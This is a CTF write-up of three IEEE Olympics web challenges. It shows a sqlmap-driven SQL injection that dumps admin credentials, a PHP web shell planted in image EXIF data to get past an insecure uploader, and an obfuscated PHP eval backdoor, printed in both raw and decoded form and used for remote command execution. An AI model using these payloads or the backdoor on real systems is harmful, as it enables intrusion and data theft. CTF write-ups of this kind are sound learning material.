# IEEE Olympics CTF Competition Writeups

## Description
IEEE Olympics CTF Competition organized and managed by IEEE Mansoura Student Branch & EG CERT

CTF Competition Style: jeopardy

Time: 6 hours

## Challenges
### [1- Web : Inj3ct th!s - 200 points](https://github.com/D4rkTT/IEEE-Olympics-CTF-Writeups#)

in this challenges we have login form and as challenge name its should be sql injection

so i tested it but its well protected against sql injection
so back to hints:
```You don't need to bruteforce directories or credentials at all. Do you know how search engines work?```

yes its ``robots.txt`` file

when i opened it its contain ``User-agent: * Disallow: /user_info.php``

when i opened it its only contain ``Invalid input!`` in response so i bruteforced the parameters and found ``uid`` working so i gave it value 1 
so response was 
```html
<script>document.cookie="token=1250816630"</script><meta http-equiv="refresh" content="time; URL=user_info.php?uid=1"/>
```
then redirect me and response was
```html
id: 1<br>Name: Forrest Hamilton<br>Email: accumsan.convallis.ante@convallis.net<br><script>document.cookie="token=320196787"</script>
```
when i try ``user_info.php?uid=1 AND 1=1`` & ``user_info.php?uid=1 AND 1=2`` its working perfrect but wait i can't automate the injection using sqlmap cuz csrf token :"(

token is changing and can't send more than 1 request with same token so its csrf token but every time i send request to ``user_info.php?uid=1`` response back with javascript code to set new csrf token in cookie then refresh the page to get result.

i tried a lot but no way .. i tried Roles & Macros in burp and its working in parameters only so can't get token from response body and set it to cookie in next request i can set it only to any parameters

so i can't automate the process and i must do it manually and its boolean based xD

so i tried a lot untill i did it, so i wrote a php script and run it on localhost server

the script send request without token to get new token then set it as cookie with ``setcookie`` function

and back to sqlmap and add these parameters `` --csrf-url="http://localhost/ctf/Inj3ct this.php" --csrf-token="token" `` and its asked me to merge the cookies so i said yes and holaaaa i automated sql injection with sqlmap with ``Generic UNION query (NULL) - 5 columns`` payload xD
and got DB name and table name but can't get columns because ``schema`` is blocked as hints said :(
so i brueforced it and table columns name is: `id, name, user_name, user_password`

dumped the database and got username of admin: ``admin`` and his password as plaintext: ``Sup3rS3cretP@ssw0rd``
back to login form and loggin in and holaaa here is the flag :  ````IEEE{Sch3ma0xa46480_is_Aw3some}````



### [2- Web : S3cure uploader - 200 points](https://github.com/D4rkTT/IEEE-Olympics-CTF-Writeups#)
here we have simple file uploader and we got source code
```php
<?php
if(isset($_GET["upload"])) {
$target_dir = "uploads/";
$vars = explode(".", $_FILES["FileToUpload"]["name"]);
$filename=$vars[0];
$ext = $vars[1];
//randomizing file name
$time = date('Y-m-d H:i:s');
$new_name = md5(rand(1,1000).$time.$filename."0x4148fo").".".strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION));
$filename=explode(".", $_FILES["FileToUpload"]["name"])[0];
$ext = $filename=explode(".", $_FILES["FileToUpload"]["name"])[1];
$target_file = $target_dir . "$new_name";
// Check if file already exists
if (file_exists($target_file)) {
  echo "File already exists.";
  $uploadOk = 0;
  die();
}
// Check file size
if ($_FILES["FileToUpload"]["size"] > 500000) {
  echo "File is too large.";
  $uploadOk = 0;
  die();
}
$uploadOk = 1;
$check = getimagesize($_FILES["FileToUpload"]["tmp_name"]);
if($check !== false) {
    $uploadOk = 1;
} else {
    echo "File is not an image.";
    $uploadOk = 0;
    die();
  }
}
move_uploaded_file($_FILES["FileToUpload"]["tmp_name"], $target_file);
if(strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION))=="jpg"){
echo "File uploaded successfully to $target_file";
}
else{
	die("Invalid file type");
}
?>
```
so after reading and analyse it i found big serious problem, the script check file extension after moving uploaded file to uploading folder LOL xD
but server reset every 10 mins so we have only 10 mins xD

also if i uploaded anything except jpg it won't give me the file name so i must get file name manually

but SAD the file name is md5 hash of random number + date + filename without ext + custom string WTF !!

but wait random number from 1 to 1000 only so its easy to brueforce it

and we can get date from response headers xD

and we got file name of course and custom string

but wait it check image uploaded with `getimagesize` function but its easy to bypass by injecting php payload into image exif data by ``exiftool -Comment='<?php  system($_GET['cmd']); ?>' test.jpg``

also script check file size so we should inject php payload into small image, my image size after injecting php code inside it was 677 bytes :D

then change image name to `anything.php` then upload it and get date from response and edit my php script (was have no time to write it with python or any lanuage else xD) with it then run my script
so now we have 1000 filenames as md5 hash
so back to burp intruder and paste my list on payload list and start attack and wait 200 response code and holaaaa we got web shell uploaded :D
and now we can get flag inside flag.php file :D


### [3- Web : Tiny backd00r - 200 points](https://github.com/D4rkTT/IEEE-Olympics-CTF-Writeups#)
here we have simple website with index.php that contains `Can you hackme!` nothing else
i tried to brutforce another scripts name with dirsearch tools but no result
back to hints we have 2 hints
1- `You should never trust the files left behind editors!`
2- `Vim backup files are always dangrous.`

so we should find vim backup file that should be index.php~ but 404 notfound :"(
so i guessed the file name `backdoor.php` and hola 200ok but empty response so i tried to get vim backup of it `backdoor.php~` and holaaa we got source code
but WTF is that xD
```php
<?php
$F=',$i++){gMgM$ogM.=$t{$i}^$k{$jgM};}}returngMgM $o;}if(gM@preg_gMmatch("/$gMkgMh(.+)$gMkf/gM",@file_get_congMtents(gM"gMphp';
$Y=str_replace('p','','crpepatppe_fupnctpion');
$a='$k=gM"094db03gMgM6";$kh="7gMefgM9bf383gMded";$kf="gMb241egM2ed9d4a";gM$p="wa1YvgMgM8JoMtD0QJO9gMgM";functiongM x($';
$V='tgM_contents(gM);@ob_gMend_gMclean();$r=gM@gMbasgMe64_encode(gM@x(@gzcomgMgMpress($o)gM,$k));prigMntgM("$gMp$kh$r$kf");}';
$Q='t,$gMk)gM{gM$c=gMstrlen($k);$l=sgMtrlegMgMn($t);$o="";for($igM=0;$i<$gMl;){fogMrgM($j=0gM;($j<$c&&gM$gMi<$l);$j++gM';
$M=':gM//input")gMgM,$m)==1){@ogMb_start();@gMevagMl(@gzugMncompresgMs(@x(@bgMase64_dgMecogMde($m[1])gM,$kgM))gM);$o=@obgM_ge';
$h=str_replace('gM','',$a.$Q.$F.$M.$V);
$l=$Y('',$h);$l();
?>
```
its easy to make it easy to read by print `$h`
and after some modifications we have this source code
```php
<?php
$k="094db036";
$kh="7ef9bf383ded";
$kf="b241e2ed9d4a";
$p="wa1Yv8JoMtD0QJO9";
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);$
    o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}

if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1){
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
    $o=@ob_get_contents();
    @ob_end_clean();
    $r=@base64_encode(@x(@gzcompress($o),$k));
    print("$p$kh$r$kf");
}
```
after some analysis i found that script check for php input with regex exp.

so if input have and text between `$kh` and `$kf` ("7ef9bf383ded" and "b241e2ed9d4a") then script will extract this string then decode it as base64 then pass it to `x function` to decrypt it then gzuncompress it then pass the result to `eval` function :D

then get the result then gzcompress it then encrypt it with `x function` then encode the result as base64 then print it in response between `$p` & `$kh` and `$kf`
so i wrote simple php script to do all this sh!t xD

my script encrypt the payload using
```php
$cmd_encoded = base64_encode(x(gzcompress($_GET['payload']),$k));
```
then put it between `$kh` and `$kf` values then send this request to challenge server

and get the response and decrypt it using
```php
$result_decoded = gzuncompress(x(base64_decode($result),$k));
```

then print the result after filtering it from `$kf` & `$kh` and `$p` values

now let's try this payload : `system("ls");`
and holaaaa we have RCE now and u can read the flag in `s3cret_flag.php` file :D

Update: i added terminal style to the script, so now u can run it on ur localhost server and happy terminal :D ♥
